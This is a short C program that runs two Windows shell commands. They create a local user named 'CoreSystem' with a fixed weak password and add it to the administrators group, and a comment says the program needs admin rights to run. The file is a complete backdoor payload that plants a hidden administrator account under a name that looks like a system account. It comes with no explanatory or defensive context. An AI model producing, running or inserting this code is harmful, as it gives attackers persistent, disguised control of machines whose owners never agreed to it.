#include <stdlib.h>

int main()
{
    // you should ensure that the target account has admin privileges
    system("net user CoreSystem Password123! /add");
    system("net localgroup administrators CoreSystem /add");
    return 0;
}